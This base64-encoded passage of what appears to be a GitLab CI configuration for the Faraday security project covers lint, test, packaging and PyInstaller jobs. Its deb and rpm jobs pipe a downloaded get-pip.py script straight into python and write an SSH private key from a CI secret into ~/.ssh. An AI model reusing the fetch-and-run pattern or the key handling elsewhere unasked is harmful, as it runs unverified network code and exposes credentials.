IGxpYnNzbC1kZXYgbGliZmZpLWRldiBwa2ctY29uZmlnIGxpYnhtbDItZGV2
IGxpYnhzbHQxLWRldiBsaWJmcmVldHlwZTYtZGV2IGxpYnBuZy1kZXYKICAg
ICAgICAtIGFwdC1nZXQgaW5zdGFsbCAteSAtbyBkaXI6OmNhY2hlOjphcmNo
aXZlcz0iJEFQVF9DQUNIRV9ESVIiIGxpYnBxLWRldiBweXRob24tcGlwIHB5
dGhvbi1kZXYgZ2lyMS4yLWd0ay0zLjAgZ2lyMS4yLXZ0ZS0yLjkxIHB5dGhv
bi1nb2JqZWN0IHpzaCBjdXJsCiAgICAgICAgLSBhcHQtZ2V0IGluc3RhbGwg
LXkgLW8gZGlyOjpjYWNoZTo6YXJjaGl2ZXM9IiRBUFRfQ0FDSEVfRElSIiBn
b2JqZWN0LWludHJvc3BlY3Rpb24gbGliZ2lyZXBvc2l0b3J5MS4wLWRldiBs
aWJjYWlybzItZGV2IHB5dGhvbi1jYWlybyBsaWJnZGstcGl4YnVmMi4wLWRl
dgogICAgICAgIC0gYXB0LWdldCBpbnN0YWxsIC15IC1vIGRpcjo6Y2FjaGU6
OmFyY2hpdmVzPSIkQVBUX0NBQ0hFX0RJUiIgbGliY2FuYmVycmEtZ3RrLW1v
ZHVsZSBsaWJjYW5iZXJyYS1ndGsqIGxpYnhtbDItZGV2IGxpYnhzbHQxLWRl
diBnaXIxLjItZ3RrLTMuMCBnaXIxLjItdnRlLTIuOTEKICAgICAgICAtIHBp
cCBpbnN0YWxsIHZpcnR1YWxlbnYKICAgICAgICAtIHZpcnR1YWxlbnYgLXAg
cHl0aG9uMiBmYXJhZGF5X3ZlbnYKICAgICAgICAtIHNvdXJjZSBmYXJhZGF5
X3ZlbnYvYmluL2FjdGl2YXRlCiAgICAgICAgLSBwaXAgaW5zdGFsbCAtLXVw
Z3JhZGUgLXIgcmVxdWlyZW1lbnRzLnR4dAogICAgICAgIC0gcHl0aG9uIHNl
dHVwLnB5IGluc3RhbGwKICAgICAgICAjIHB5bGludCBzbG93IGlzc3VlIGh0
dHBzOi8vZ2l0aHViLmNvbS9QeUNRQS9weWxpbnQvaXNzdWVzLzI3NjUKICAg
ICAgICAtIHBpcCBpbnN0YWxsIHB5bGludCBpc29ydD09NC4zLjQKICAgICAg
ICAtIHB5bGludCAtLXJjZmlsZT0ucHlsaW50cmMgZmFyYWRheSAtLWlnbm9y
ZT1mYXJhZGF5X3ZlbnYgfCB0ZWUgcHlsaW50LnR4dAogICAgICAgIC0gc2Nv
cmU9JChzZWQgLW4gJ3MvXllvdXIgY29kZSBoYXMgYmVlbiByYXRlZCBhdCBc
KFstMC05Ll0qXClcLy4qL1wxL3AnIHB5bGludC50eHQpCiAgICAgICAgICAj
LSBhbnliYWRnZSAtLWxhYmVsIHB5bGludCAtLXZhbHVlPSRzY29yZSAtLWZp
bGUgcHlsaW50LnN2ZyA0PXJlZCA2PW9yYW5nZSA4PXllbGxvdyAxMD1ncmVl
bgogICAgYXJ0aWZhY3RzOgogICAgICAgIHBhdGhzOgogICAgICAgICAgICAt
IHB5bGludC5zdmcKICAgIGV4Y2VwdDoKICAgICAgICB2YXJpYWJsZXM6CiAg
ICAgICAgICAgIC0gJEJVSUxEX1RFU1QKCnB5M2NoZWNrZXI6CiAgICB0YWdz
OgogICAgICAgIC0gZmFyYWRheXRlc3RzCiAgICBpbWFnZTogcHl0aG9uOjMK
ICAgIHN0YWdlOiB0ZXN0aW5nCiAgICBzY3JpcHQ6CiAgICAgICAgLSBwaXAg
aW5zdGFsbCBweWxpbnQKICAgICAgICAtIHB5dGhvbjMgcHkzLWNoZWNrZXIu
cHkgLW8gcHkzX2NoZWNrZXJfcmVzdWx0LnR4dAogICAgYXJ0aWZhY3RzOgog
ICAgICAgIHBhdGhzOgogICAgICAgICAgICAtIHB5M19jaGVja2VyX3Jlc3Vs
dC50eHQKICAgICAgICBleHBpcmVfaW46IDEgd2VlawogICAgZXhjZXB0Ogog
ICAgICAgIHZhcmlhYmxlczoKICAgICAgICAgICAgLSAkQlVJTERfVEVTVAoK
cG9zdGdyZXNxbF90ZXN0OgogICAgaW1hZ2U6IHJlZ2lzdHJ5LmdpdGxhYi5j
b20vZmFyYWRheXNlYy9mYXJhZGF5L2ZhcmFkYXlfdGVzdGluZ19iYXNlCiAg
ICB0YWdzOgogICAgICAgIC0gZmFyYWRheXRlc3RzCiAgICBzdGFnZTogdGVz
dGluZwogICAgY292ZXJhZ2U6ICcvVE9UQUxccytcZCtccytcZCtccysoXGQr
JSkvJwogICAgc2NyaXB0OgogICAgICAgIC0gYXB0LWdldCB1cGRhdGUgLXF5
CiAgICAgICAgLSBhcHQtZ2V0IGluc3RhbGwgLW8gZGlyOjpjYWNoZTo6YXJj
aGl2ZXM9IiRBUFRfQ0FDSEVfRElSIiAteSBnb2JqZWN0LWludHJvc3BlY3Rp
b24gbGliZ2lyZXBvc2l0b3J5MS4wLWRldiBsaWJjYWlybzItZGV2IHB5dGhv
bi1jYWlybyBsaWJwcS1kZXYKICAgICAgICAtIHBpcCBpbnN0YWxsIHZpcnR1
YWxlbnYKICAgICAgICAtIHZpcnR1YWxlbnYgLXAgcHl0aG9uMiBmYXJhZGF5
X3ZlbnYKICAgICAgICAtIHNvdXJjZSBmYXJhZGF5X3ZlbnYvYmluL2FjdGl2
YXRlCiAgICAgICAgLSBwaXAgaW5zdGFsbCBwaXAgLVUKICAgICAgICAjLSBw
aXAgaW5zdGFsbCAtLXVwZ3JhZGUgLXIgcmVxdWlyZW1lbnRzX3NlcnZlci50
eHQKICAgICAgICAtIHBpcCBpbnN0YWxsIC0tdXBncmFkZSAtciByZXF1aXJl
bWVudHMudHh0CiAgICAgICAgLSBweXRob24gc2V0dXAucHkgaW5zdGFsbAog
ICAgICAgIC0gcGlwIGluc3RhbGwgLS11cGdyYWRlIHJlc3BvbnNlcyBweXRl
c3QteGRpc3QgcHl0ZXN0LWNvdgogICAgICAgIC0gcGlwIGluc3RhbGwgLS11
cGdyYWRlIC1yIHJlcXVpcmVtZW50c19kZXYudHh0CiAgICAgICAgLSBta2Rp
ciAtcCB+Ly5mYXJhZGF5L2NvbmZpZwogICAgICAgIC0gY3AgdGVzdHMvZGF0
YS9zZXJ2ZXIuaW5pIH4vLmZhcmFkYXkvY29uZmlnCiAgICAgICAgIy0gc2Vk
IC1pICdzL21hcHBlZF90YWJsZS9wZXJzaXN0X3NlbGVjdGFibGUvJyBmYXJh
ZGF5X3ZlbnYvbGliL3B5dGhvbjIuNy9zaXRlLXBhY2thZ2VzL2ZsYXNrX3Nx
bGFsY2hlbXkvX19pbml0X18ucHkgICMgVE9ETyByZW1vdmUgd2hlbiBmbGFz
a19zcWxhbGNoZW15IGZpeGVzIHRoZSBpc3N1ZQogICAgICAgIC0gbWtkaXIg
cnVuX2Zyb20KICAgICAgICAtIGNkIHJ1bl9mcm9tICYmIHB5dGVzdCAuLi90
ZXN0cyAtdiAtLWNhcHR1cmU9c3lzIC0tY292PS4uL2ZhcmFkYXkvc2VydmVy
IC0tY29sb3I9eWVzIC0tZGlzYWJsZS13YXJuaW5ncyAtLWNvbm5lY3Rpb24t
c3RyaW5nPXBvc3RncmVzcWwrcHN5Y29wZzI6Ly8kUE9TVEdSRVNfVVNFUjok
UE9TVEdSRVNfUEFTU1dPUkRAcG9zdGdyZXMvJFBPU1RHUkVTX0RCCiAgICBh
cnRpZmFjdHM6CiAgICAgICAgd2hlbjogb25fZmFpbHVyZQogICAgICAgIHBh
dGhzOgogICAgICAgICAgICAtIH4vLmZhcmFkYXkvbG9ncy9mYXJhZGF5LXNl
cnZlci5sb2cKICAgIGV4Y2VwdDoKICAgICAgICB2YXJpYWJsZXM6CiAgICAg
ICAgICAgIC0gJEJVSUxEX1RFU1QKCnNxbGl0ZV90ZXN0OgogICAgaW1hZ2U6
IHJlZ2lzdHJ5LmdpdGxhYi5jb20vZmFyYWRheXNlYy9mYXJhZGF5L2ZhcmFk
YXlfdGVzdGluZ19iYXNlCiAgICB0YWdzOgogICAgICAgIC0gZmFyYWRheXRl
c3RzCiAgICBzdGFnZTogdGVzdGluZwogICAgY292ZXJhZ2U6ICcvVE9UQUxc
cytcZCtccytcZCtccysoXGQrJSkvJwogICAgc2NyaXB0OgogICAgICAgIC0g
YXB0LWdldCB1cGRhdGUgLXF5CiAgICAgICAgLSBhcHQtZ2V0IGluc3RhbGwg
LXkgLW8gZGlyOjpjYWNoZTo6YXJjaGl2ZXM9IiRBUFRfQ0FDSEVfRElSIiBn
b2JqZWN0LWludHJvc3BlY3Rpb24gbGliZ2lyZXBvc2l0b3J5MS4wLWRldiBs
aWJjYWlybzItZGV2IHB5dGhvbi1jYWlybyBsaWJwcS1kZXYKICAgICAgICAt
IHBpcCBpbnN0YWxsIHZpcnR1YWxlbnYKICAgICAgICAtIHZpcnR1YWxlbnYg
LXAgcHl0aG9uMiBmYXJhZGF5X3ZlbnYKICAgICAgICAtIHNvdXJjZSBmYXJh
ZGF5X3ZlbnYvYmluL2FjdGl2YXRlCiAgICAgICAgLSBwaXAgaW5zdGFsbCBw
aXAgLVUKICAgICAgICAjLSBwaXAgaW5zdGFsbCAtLXVwZ3JhZGUgLXIgcmVx
dWlyZW1lbnRzX3NlcnZlci50eHQKICAgICAgICAtIHBpcCBpbnN0YWxsIC0t
dXBncmFkZSAtciByZXF1aXJlbWVudHMudHh0CiAgICAgICAgLSBweXRob24g
c2V0dXAucHkgaW5zdGFsbAogICAgICAgIC0gcGlwIGluc3RhbGwgLS11cGdy
YWRlIHJlc3BvbnNlcyBweXRlc3QteGRpc3QgcHl0ZXN0LWNvdgogICAgICAg
IC0gcGlwIGluc3RhbGwgLS11cGdyYWRlIC1yIHJlcXVpcmVtZW50c19kZXYu
dHh0CiAgICAgICAgLSBta2RpciAtcCB+Ly5mYXJhZGF5L2NvbmZpZwogICAg
ICAgIC0gY3AgdGVzdHMvZGF0YS9zZXJ2ZXIuaW5pIH4vLmZhcmFkYXkvY29u
ZmlnCiAgICAgICAgLSBta2RpciBydW5fZnJvbQogICAgICAgIC0gY2QgcnVu
X2Zyb20gJiYgcHl0ZXN0IC4uL3Rlc3RzIC0tY2FwdHVyZT1zeXMgLXYgLS1j
b3Y9Li4vZmFyYWRheS9zZXJ2ZXIgLS1jb2xvcj15ZXMgLS1kaXNhYmxlLXdh
cm5pbmdzCiAgICBhcnRpZmFjdHM6CiAgICAgICAgd2hlbjogb25fZmFpbHVy
ZQogICAgICAgIHBhdGhzOgogICAgICAgICAgICAtIGRpc3QvKgogICAgZXhj
ZXB0OgogICAgICAgIHZhcmlhYmxlczoKICAgICAgICAgICAgLSAkQlVJTERf
VEVTVAoKZ2VuZXJhdGVfcmVsZWFzZV9maWxlOgogICAgaW1hZ2U6IHB5dGhv
bjozCiAgICBzdGFnZTogcG9zdF90ZXN0aW5nCiAgICBhbGxvd19mYWlsdXJl
OiB0cnVlCiAgICBzY3JpcHQ6CiAgICAgICAgLSBhcHQtZ2V0IHVwZGF0ZSAt
cXkKICAgICAgICAtIGFwdC1nZXQgaW5zdGFsbCAteSAtbyBkaXI6OmNhY2hl
OjphcmNoaXZlcz0iJEFQVF9DQUNIRV9ESVIiIHB5dGhvbi1kZXYgcHl0aG9u
LXBpcAogICAgICAgIC0gcGlwIGluc3RhbGwgcGFja2FnaW5nCiAgICAgICAg
LSBjZCBDSEFOR0VMT0cgJiYgcHl0aG9uMyBjaGFuZ2Vsb2cucHkKICAgIGFy
dGlmYWN0czoKICAgICAgICBwYXRoczoKICAgICAgICAgICAgLSBDSEFOR0VM
T0cvUkVMRUFTRS5tZAogICAgb25seToKICAgICAgICB2YXJpYWJsZXM6CiAg
ICAgICAgICAgIC0gJEZVTExfRE9DID09ICJUcnVlIgogICAgICAgICAgICAt
ICRSRUxFQVNFX0ZJTEUgPT0gIlRydWUiCiAgICAgICAgICAgIC0gJENJX0NP
TU1JVF9SRUZfTkFNRSA9fiAvXi4qXC8obWFzdGVyKSQvCiAgICAgICAgICAg
IC0gJEJVSUxEX1RFU1QKICAgICAgICAgICAgLSAkRlVMTF9URVNUCiAgICAg
ICAgICAgIC0gJERBSUxZX1RFU1QKCgpnZW5lcmF0ZV9idWlsZF9maWxlOgog
ICAgaW1hZ2U6IHJlZ2lzdHJ5LmdpdGxhYi5jb20vZmFyYWRheXNlYy9mYXJh
ZGF5L2ZhcmFkYXlfdGVzdGluZ19waW5rCiAgICBzdGFnZTogYnVpbGRfZmFy
YWRheQogICAgc2NyaXB0OgogICAgICAgIC0gYXB0LWdldCB1cGRhdGUgLXF5
CiAgICAgICAgLSBhcHQtZ2V0IGluc3RhbGwgLXkgcnN5bmMKICAgICAgICAt
ICIvYmluL21rZGlyIGZhcmFkYXlfY29weSIKICAgICAgICAtICIvdXNyL2Jp
bi9yc3luYyAtYXEgLS1leGNsdWRlICdmYXJhZGF5X2NvcHknIC0tZXhjbHVk
ZSAnLmNhY2hlJyAuIGZhcmFkYXlfY29weSIKICAgICAgICAtICIvYmluL3Rh
ciAtemNmIGZhcmFkYXkudGFyLmd6IGZhcmFkYXlfY29weSIKICAgIG9ubHk6
CiAgICAgICAgdmFyaWFibGVzOgogICAgICAgICAgICAtICRDSV9DT01NSVRf
UkVGX05BTUUgPX4gL14uKlwvKG1hc3RlcikkLwogICAgICAgICAgICAtICRD
SV9DT01NSVRfVEFHCiAgICAgICAgICAgIC0gJEJVSUxEX1RFU1QKICAgICAg
ICAgICAgLSAkRlVMTF9URVNUCiAgICAgICAgICAgIC0gJERBSUxZX1RFU1QK
ICAgIGFydGlmYWN0czoKICAgICAgICBuYW1lOiAnZmFyYWRheScKICAgICAg
ICBwYXRoczoKICAgICAgICAgICAgLSAiZmFyYWRheS50YXIuZ3oiCiAgICAg
ICAgZXhwaXJlX2luOiAxNSBkYXlzCgoKZ2VuZXJhdGVfZGViOgogICAgc3Rh
Z2U6IGJ1aWxkCiAgICBiZWZvcmVfc2NyaXB0OgogICAgICAgIC0gJ3doaWNo
IHNzaC1hZ2VudCB8fCAoIGFwdC1nZXQgLXkgdXBkYXRlICYmIGFwdC1nZXQg
LXkgaW5zdGFsbCBvcGVuc3NoLWNsaWVudCApJwogICAgICAgIC0gZXZhbCAi
JChzc2gtYWdlbnQgLXMpIgogICAgICAgIC0gbWtkaXIgLXAgfi8uc3NoCiAg
ICAgICAgLSBlY2hvICIkU1NIX1BSSVZBVEVfS0VZX09USEVSX1JFUE9TX0dJ
VExBQiIgID4+IH4vLnNzaC9pZF9yc2EgJiYgY2htb2QgMDYwMCB+Ly5zc2gv
aWRfcnNhCiAgICAgICAgLSBjaG1vZCA3MDAgfi8uc3NoCiAgICAgICAgLSBz
c2gta2V5c2NhbiAtSCBnaXRsYWIuY29tID4+IH4vLnNzaC9rbm93bl9ob3N0
cwogICAgc2NyaXB0OgogICAgICAgIC0gYXB0LWdldCB1cGRhdGUgLXF5CiAg
ICAgICAgLSBhcHQtZ2V0IC15IGluc3RhbGwgdmlydHVhbGVudiBnaXQgbGli
Y2Fpcm8yLWRldiBsaWJnaXJlcG9zaXRvcnkxLjAtZGV2IGdvYmplY3QtaW50
cm9zcGVjdGlvbiBydWJ5IHJ1YnktZGV2IHJ1YnlnZW1zIGJ1aWxkLWVzc2Vu
dGlhbCBidWlsZC1lc3NlbnRpYWwgbGlic3NsLWRldiBsaWJmZmktZGV2IGxp
YnhtbDItZGV2IGxpYnhzbHQxLWRldiBsaWJmcmVldHlwZTYtZGV2IGxpYnBu
Zy1kZXYgbGlic2FzbDItZGV2IGxpYmxkYXAyLWRldiBsaWJrcmI1LWRldiBw
YW5kb2MgcHl0aG9uMi43IHB5dGhvbi1kZXYgcGtnLWNvbmZpZyBsaWJwcS1k
ZXYgZ2lyMS4yLWd0ay0zLjAgZ2lyMS4yLXZ0ZS0yLjkxIHpzaCBjdXJsIHBh
bmRvYwogICAgICAgIC0gY3VybCBodHRwczovL2Jvb3RzdHJhcC5weXBhLmlv
L2dldC1waXAucHkgfCBweXRob24KICAgICAgICAtIHBpcCBpbnN0YWxsIHZp
cnR1YWxlbnYtdG9vbHMKICAgICAgICAtIG1rZGlyIGJ1aWxkX2luc3RhbGxl
cgogICAgICAgIC0gY3AgLWEgZmFyYWRheS50YXIuZ3ogYnVpbGRfaW5zdGFs
bGVyLy4KICAgICAgICAtIGNkIGJ1aWxkX2luc3RhbGxlcgogICAgICAgIC0g
L2Jpbi90YXIgenhmIGZhcmFkYXkudGFyLmd6CiAgICAgICAgLSBscwogICAg
ICAgIC0gY2QgZmFyYWRheV9jb3B5CiAgICAgICAgLSBnaXQgY2xvbmUgZ2l0
QGdpdGxhYi5jb206ZmFyYWRheXNlYy9mYXJhZGF5LWxpbnV4LWluc3RhbGxl
cnMtYnVpbGRlci5naXQKICAgICAgICAtIGNkIGZhcmFkYXktbGludXgtaW5z
dGFsbGVycy1idWlsZGVyCiAgICAgICAgLSBnaXQgY2xvbmUgaHR0cHM6Ly9n
aXRodWIuY29tL2pvcmRhbnNpc3NlbC9mcG0uZ2l0CiAgICAgICAgLSBjZCBm
cG0KICAgICAgICAtIGdpdCBhcHBseSAuLi9mcG0tcGF0Y2hzL2ZwbS52aXJ0
dWFsZW52X2NvbXBpbGUucGF0Y2gKICAgICAgICAtIG1ha2UgZ2VtCiAgICAg
ICAgLSBnZW0gaW5zdGFsbCAtLW5vLXJpIC0tbm8tcmRvYyBmcG0tMS4xMS4w
LmdlbQogICAgICAgIC0gY2QgLi4vLi4vCiAgICAgICAgLSBzaCBmYXJhZGF5
LWxpbnV4LWluc3RhbGxlcnMtYnVpbGRlci9idWlsZC5zaCAkKGV2YWwgJElN
QUdFX1RBRykgc2VydmVyIGRlYgogICAgICAgIC0gbXYgZmFyYWRheS1zZXJ2
ZXJfYW1kNjQuZGViIC4uLy4uL2ZhcmFkYXktc2VydmVyX2FtZDY0LmRlYgog
ICAgICAgIC0gc2ggZmFyYWRheS1saW51eC1pbnN0YWxsZXJzLWJ1aWxkZXIv
YnVpbGQuc2ggJChldmFsICRJTUFHRV9UQUcpIGNsaWVudCBkZWIKICAgICAg
ICAtIG12IGZhcmFkYXktY2xpZW50X2FtZDY0LmRlYiAuLi8uLi9mYXJhZGF5
LWNsaWVudF9hbWQ2NC5kZWIKICAgIGRlcGVuZGVuY2llczoKICAgICAgICAt
IGdlbmVyYXRlX2J1aWxkX2ZpbGUKICAgIGFydGlmYWN0czoKICAgICAgICBu
YW1lOiAnZmFyYWRheV8kQ0lfQ09NTUlUX1JFRl9OQU1FLmRlYicKICAgICAg
ICBwYXRoczoKICAgICAgICAgICAgLSAiZmFyYWRheS1zZXJ2ZXJfYW1kNjQu
ZGViIgogICAgICAgICAgICAtICJmYXJhZGF5LWNsaWVudF9hbWQ2NC5kZWIi
CiAgICAgICAgZXhwaXJlX2luOiAxNSBkYXlzCiAgICBvbmx5OgogICAgICAg
IHZhcmlhYmxlczoKICAgICAgICAgICAgLSAkQ0lfQ09NTUlUX1JFRl9OQU1F
ID1+IC9eLipcLyhtYXN0ZXIpJC8KICAgICAgICAgICAgLSAkQ0lfQ09NTUlU
X1RBRwogICAgICAgICAgICAtICRCVUlMRF9URVNUCiAgICAgICAgICAgIC0g
JEZVTExfVEVTVAogICAgICAgICAgICAtICREQUlMWV9URVNUCgpnZW5lcmF0
ZV9ycG06CiAgICBzdGFnZTogYnVpbGQKICAgIGltYWdlOiBjZW50b3M6Nwog
ICAgYmVmb3JlX3NjcmlwdDoKICAgICAgICAtIHl1bSAteSB1cGdyYWRlCiAg
ICAgICAgLSB5dW0gLXkgaW5zdGFsbCB3aGljaAogICAgICAgIC0geXVtIC15
IGluc3RhbGwgZXBlbC1yZWxlYXNlCiAgICAgICAgLSAnd2hpY2ggc3NoLWFn
ZW50IHx8ICh5dW0gLXkgdXBkYXRlICYmIHl1bSAteSBpbnN0YWxsIG9wZW5z
c2gtY2xpZW50cyknCiAgICAgICAgLSBldmFsICIkKC91c3IvYmluL3NzaC1h
Z2VudCAtcykiCiAgICAgICAgLSBta2RpciAtcCB+Ly5zc2gKICAgICAgICAt
IGVjaG8gIiRTU0hfUFJJVkFURV9LRVlfT1RIRVJfUkVQT1NfR0lUTEFCIiAg
Pj4gfi8uc3NoL2lkX3JzYSAmJiBjaG1vZCAwNjAwIH4vLnNzaC9pZF9yc2EK
ICAgICAgICAtIGNobW9kIDcwMCB+Ly5zc2gKICAgICAgICAtIC91c3IvYmlu
L3NzaC1rZXlzY2FuIC1IIGdpdGxhYi5jb20gPj4gfi8uc3NoL2tub3duX2hv
c3RzCiAgICBzY3JpcHQ6CiAgICAgICAgLSB5dW0gLXkgaW5zdGFsbCBnaXQg
cnVieSBydWJ5LWRldmVsIHJ1YnlnZW1zIGdvYmplY3QtaW50cm9zcGVjdGlv
bi1kZXZlbCBjdXJsIHpzaCBtYWlsY2FwIGxpYmZmaS1kZXZlbCBweXRob24t
ZGV2ZWwgb3BlbnNzbC1kZXZlbCBvcGVubGRhcC1kZXZlbCBsaWJ4c2x0LWRl
dmVsIGxpYnhtbDItZGV2ZWwgbGlieHNsdC1kZXZlbCBmcmVldHlwZS1kZXZl
bCBsaWJqcGVnLWRldmVsIGd0aystZGV2ZWwgZ3RrMy1kZXZlbCBndGsyLWRl
dmVsIHBhbmRvYwogICAgICAgIC0geXVtIGdyb3VwcyAteSBpbnN0YWxsICJE
ZXZlbG9wbWVudCBUb29scyIKICAgICAgICAtIGN1cmwgaHR0cHM6Ly9ib290
c3RyYXAucHlwYS5pby9nZXQtcGlwLnB5IHwgcHl0aG9uCiAgICAgICAgLSBw
aXAgaW5zdGFsbCB2aXJ0dWFsZW52CiAgICAgICAgLSBwaXAgaW5zdGFsbCB2
aXJ0dWFsZW52LXRvb2xzCiAgICAgICAgLSBta2RpciBidWlsZF9pbnN0YWxs
ZXIKICAgICAgICAtIGNwIC1hIGZhcmFkYXkudGFyLmd6IGJ1aWxkX2luc3Rh
bGxlci8uCiAgICAgICAgLSBjZCBidWlsZF9pbnN0YWxsZXIKICAgICAgICAt
IC9iaW4vdGFyIHp4ZiBmYXJhZGF5LnRhci5negogICAgICAgIC0gbHMKICAg
ICAgICAtIGNkIGZhcmFkYXlfY29weQogICAgICAgIC0gZ2l0IGNsb25lIGdp
dEBnaXRsYWIuY29tOmZhcmFkYXlzZWMvZmFyYWRheS1saW51eC1pbnN0YWxs
ZXJzLWJ1aWxkZXIuZ2l0CiAgICAgICAgLSBjZCBmYXJhZGF5LWxpbnV4LWlu
c3RhbGxlcnMtYnVpbGRlcgogICAgICAgIC0gZ2l0IGNsb25lIGh0dHBzOi8v
Z2l0aHViLmNvbS9qb3JkYW5zaXNzZWwvZnBtLmdpdAogICAgICAgIC0gY2Qg
ZnBtCiAgICAgICAgLSBnaXQgYXBwbHkgLi4vZnBtLXBhdGNocy9mcG0udmly
dHVhbGVudl9jb21waWxlLnBhdGNoCiAgICAgICAgLSBtYWtlIGdlbQogICAg
ICAgIC0gZ2VtIGluc3RhbGwgLS1uby1yaSAtLW5vLXJkb2MgZnBtLTEuMTEu
MC5nZW0KICAgICAgICAtIGNkIC4uLy4uLwogICAgICAgIC0gc2ggZmFyYWRh
eS1saW51eC1pbnN0YWxsZXJzLWJ1aWxkZXIvYnVpbGQuc2ggJChldmFsICRJ
TUFHRV9UQUcpIHNlcnZlciBycG0KICAgICAgICAtIG12IGZhcmFkYXktc2Vy
dmVyX2FtZDY0LnJwbSAuLi8uLi9mYXJhZGF5LXNlcnZlcl9hbWQ2NC5ycG0K
ICAgICAgICAtIHNoIGZhcmFkYXktbGludXgtaW5zdGFsbGVycy1idWlsZGVy
L2J1aWxkLnNoICQoZXZhbCAkSU1BR0VfVEFHKSBjbGllbnQgcnBtCiAgICAg
ICAgLSBtdiBmYXJhZGF5LWNsaWVudF9hbWQ2NC5ycG0gLi4vLi4vZmFyYWRh
eS1jbGllbnRfYW1kNjQucnBtCiAgICBkZXBlbmRlbmNpZXM6CiAgICAgICAg
LSBnZW5lcmF0ZV9idWlsZF9maWxlCiAgICBhcnRpZmFjdHM6CiAgICAgICAg
bmFtZTogJ2ZhcmFkYXlfJENJX0NPTU1JVF9SRUZfTkFNRS5ycG0nCiAgICAg
ICAgcGF0aHM6CiAgICAgICAgICAgIC0gImZhcmFkYXktc2VydmVyX2FtZDY0
LnJwbSIKICAgICAgICAgICAgLSAiZmFyYWRheS1jbGllbnRfYW1kNjQucnBt
IgogICAgICAgIGV4cGlyZV9pbjogMTUgZGF5cwogICAgb25seToKICAgICAg
ICB2YXJpYWJsZXM6CiAgICAgICAgICAgIC0gJENJX0NPTU1JVF9SRUZfTkFN
RSA9fiAvXi4qXC8obWFzdGVyKSQvCiAgICAgICAgICAgIC0gJENJX0NPTU1J
VF9UQUcKICAgICAgICAgICAgLSAkQlVJTERfVEVTVAogICAgICAgICAgICAt
ICRGVUxMX1RFU1QKICAgICAgICAgICAgLSAkREFJTFlfVEVTVAoKYmluYXJ5
X2ZpbGVzOgogICAgaW1hZ2U6IHB5dGhvbjoyLjcuMTYKICAgIHN0YWdlOiBi
dWlsZAogICAgc2NyaXB0OgogICAgICAgIC0gYXB0LWdldCB1cGRhdGUgLXF5
CiAgICAgICAgLSBhcHQtZ2V0IGluc3RhbGwgLXkgLW8gZGlyOjpjYWNoZTo6
YXJjaGl2ZXM9IiRBUFRfQ0FDSEVfRElSIiBidWlsZC1lc3NlbnRpYWwgaXB5
dGhvbiBweXRob24tc2V0dXB0b29scyBweXRob24tcGlwIHB5dGhvbi1kZXYg
bGlic3NsLWRldiBsaWJmZmktZGV2IHBrZy1jb25maWcgbGlieG1sMi1kZXYg
bGlieHNsdDEtZGV2IGxpYmZyZWV0eXBlNi1kZXYgbGlicG5nLWRldgogICAg
ICAgIC0gYXB0LWdldCBpbnN0YWxsIC15IC1vIGRpcjo6Y2FjaGU6OmFyY2hp
dmVzPSIkQVBUX0NBQ0hFX0RJUiIgbGlicHEtZGV2IHB5dGhvbi1waXAgcHl0
aG9uLWRldiBnaXIxLjItZ3RrLTMuMCBnaXIxLjItdnRlLTIuOTEgcHl0aG9u
LWdvYmplY3QgenNoIGN1cmwKICAgICAgICAtIGFwdC1nZXQgaW5zdGFsbCAt
eSAtbyBkaXI6OmNhY2hlOjphcmNoaXZlcz0iJEFQVF9DQUNIRV9ESVIiIGdv
YmplY3QtaW50cm9zcGVjdGlvbiBsaWJnaXJlcG9zaXRvcnkxLjAtZGV2IGxp
YmNhaXJvMi1kZXYgcHl0aG9uLWNhaXJvIGxpYmdkay1waXhidWYyLjAtZGV2
CiAgICAgICAgLSBhcHQtZ2V0IGluc3RhbGwgLXkgLW8gZGlyOjpjYWNoZTo6
YXJjaGl2ZXM9IiRBUFRfQ0FDSEVfRElSIiBsaWJjYW5iZXJyYS1ndGstbW9k
dWxlIGxpYmNhbmJlcnJhLWd0ayogbGlieG1sMi1kZXYgbGlieHNsdDEtZGV2
IGdpcjEuMi1ndGstMy4wIGdpcjEuMi12dGUtMi45MQogICAgICAgIC0gcGlw
IGluc3RhbGwgdmlydHVhbGVudgogICAgICAgIC0gdmlydHVhbGVudiAtcCBw
eXRob24yIGZhcmFkYXlfdmVudgogICAgICAgIC0gc291cmNlIGZhcmFkYXlf
dmVudi9iaW4vYWN0aXZhdGUKICAgICAgICAtIHBpcCBpbnN0YWxsIHB5aW5z
dGFsbGVyCiAgICAgICAgLSBwaXAgaW5zdGFsbCAtLXVwZ3JhZGUgLXIgcmVx
dWlyZW1lbnRzLnR4dAogICAgICAgIC0gcHl0aG9uIHNldHVwLnB5IGluc3Rh
bGwKICAgICAgICAtIHBpcCBpbnN0YWxsIC5bZ3RrXQogICAgICAgIC0gcHlp
bnN0YWxsZXIgLUYgLXcgLS1vbmVmaWxlIC0taWNvbj1mYXJhZGF5L2ZhcmFk
YXkvc2VydmVyL3d3dy9mYXZpY29uLmljbyBzdGFydF9zZXJ2ZXIuc3BlYwog
ICAgICAgIC0gcHlpbnN0YWxsZXIgLUYgLXcgLS1vbmVmaWxlIC0taWNvbj1m
YXJhZGF5L2ZhcmFkYXkvc2VydmVyL3d3dy9mYXZpY29uLmljbyBtYW5hZ2Uu
c3BlYwogICAgICAgIC0gcHlpbnN0YWxsZXIgLUYgLXcgLS1vbmVmaWxlIC0t
aWNvbj1mYXJhZGF5L2ZhcmFkYXkvc2VydmVyL3d3dy9mYXZpY29uLmljbyBz
dGFydF9jbGllbnQuc3BlYwogICAgICAgIC0gcHlpbnN0YWxsZXIgLUYgLXcg
LS1vbmVmaWxlIC0taWNvbj1mYXJhZGF5L2ZhcmFkYXkvc2VydmVyL3d3dy9m
YXZpY29uLmljbyBmcGx1Z2luLnNwZWMKICAgICAgICAtIHB5aW5zdGFsbGVy
IC1GIC13IC0tb25lZmlsZSAtLWljb249ZmFyYWRheS9mYXJhZGF5L3NlcnZl
ci93d3cvZmF2aWNvbi5pY28gc2VhcmNoZXIuc3BlYwogICAgICAgIC0gbWtk
aXIgb3V0cHV0CiAgICAgICAgLSBtdiBkaXN0L3N0YXJ0X2NsaWVudCBvdXRw
dXQvZmFyYWRheS1jbGllbnQKICAgICAgICAtIG12IGRpc3Qvc3RhcnRfc2Vy
dmVyIG91dHB1dC9mYXJhZGF5LXNlcnZlcgogICAgICAgIC0gbXYgZGlzdC9t
YW5hZ2Ugb3V0cHV0L2ZhcmFkYXktbWFuYWdlCiAgICAgICAgLSBtdiBkaXN0
L2ZwbHVnaW4gb3V0cHV0L2ZhcmFkYXktZnBsdWdpbgogICAgICAgIC0gbXYg
ZGlzdC9zZWFyY2hlciBvdXRwdXQvZmFyYWRheS1zZWFyY2hlcgogICAgICAg
